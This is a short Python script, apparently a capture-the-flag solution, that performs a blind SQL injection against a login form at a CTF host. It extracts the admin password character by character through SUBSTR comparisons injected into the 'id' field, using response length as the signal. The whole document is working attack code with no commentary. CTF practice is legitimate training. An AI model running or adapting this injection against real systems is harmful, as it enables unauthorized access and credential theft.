import requests

url = 'http://ctfq.sweetduet.info:10080/~q6/'

for i in range(1, 22):
    for j in range(48, 123):
        char = chr(j)
        sql = f"admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {i}, 1) = \'{char}\' --"
        payload = {
            'id': sql,
            'pass': ''
        }
        res = requests.post(url, data=payload)
        if len(res.text) > 2000:
            print(char, end="")
            break
print()
